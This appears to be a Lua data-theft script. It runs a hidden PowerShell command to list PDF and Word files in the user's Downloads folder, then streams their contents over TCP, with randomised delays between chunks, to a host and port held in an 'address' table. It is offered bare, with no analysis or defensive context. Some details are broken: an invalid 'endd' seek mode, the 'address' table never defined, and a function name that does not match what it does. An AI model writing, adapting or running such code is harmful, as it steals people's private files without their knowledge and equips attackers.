local io = require("io")
local socket = require("socket")
local script = [[
[Console]::OutputEncoding = [Text.Encoding]::UTF8
Get-ChildItem -Path $env:USERPROFILE\Downloads -Recurse -Include *.pdf,*.doc* -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
]]

local CHUNK = 1024 * 64

local function eval(command)
    local oneliner = command:gsub("[\r\n]+", ";")
    local handle = io.popen('powershell -NoProfile -WindowStyle hidden -Command "' .. oneliner .. '"')
    if not handle then return nil end
    local result = handle:read("*a")
    handle:close()
    if result then result = result:gsub("%z", "") end
    return result
end

local function findCFiles()
    local output = eval(script)
    if not output then return nil end
    local files = {}
    for raw_line in output:gmatch("[^\r\n]+") do
        local cleaned = raw_line:gsub("[\t\r]", ""):gsub("^%s+", ""):gsub("%s+$", "")
        if cleaned ~= "" and cleaned:match("\\") then 
            files[#files + 1] = cleaned 
        end
    end
    return files
end

local function reportFiles(files, host, port)
    local tcp, terr = socket.tcp()
    if not tcp then return nil, "socket: " .. tostring(terr) end
    tcp:settimeout(10)

    local ok, cerr = tcp:connect(host, port)
    if not ok then
        tcp:close()
        return nil, "connect: " .. tostring(cerr)
    end

    for _, fpath in ipairs(files) do
        local file = io.open(fpath, "rb")
        if not file then
            goto continue
        end

        local size = file:seek("endd")
        file:seek("set", 0)

        local hok, herr = tcp:send(string.format("FILE %s %d\n", fpath, size))
        if not hok then
            file:close(); tcp:close()
            return nil, "header send: " .. tostring(herr)
        end

        local total = 0
        while total < size do
            local chunk = file:read(CHUNK)
            if not chunk then break end
            total = total + #chunk
            local sok, serr = tcp:send(chunk)
            socket.sleep(math.random(1,10)/10)
            if not sok then
                file:close(); tcp:close()
                return nil, "chunk send: " .. tostring(serr)
            end
        end

        file:close()
        ::continue::
    end

    tcp:close()
    return true
end

local function MAIN()
    local files = findCFiles()
    if not files or #files == 0 then return end
    local ok, err = reportFiles(files, address[1], address[2])
end

MAIN()
